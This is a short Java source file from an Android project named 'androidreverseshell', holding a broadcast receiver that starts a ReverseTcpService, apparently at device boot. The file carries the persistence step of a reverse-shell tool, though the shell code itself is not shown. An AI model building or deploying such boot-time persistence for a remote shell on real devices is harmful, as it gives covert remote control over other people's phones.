package com.anythingintellect.androidreverseshell.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.anythingintellect.androidreverseshell.ReverseTcpService;

/**
 * Created by ishan.dhingra on 21/07/16.
 */

public class StartUpBootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d("rvtcp", "Starting rvtcp");
        Intent reverseService = new Intent(context, ReverseTcpService.class);
        context.startService(reverseService);
    }
}
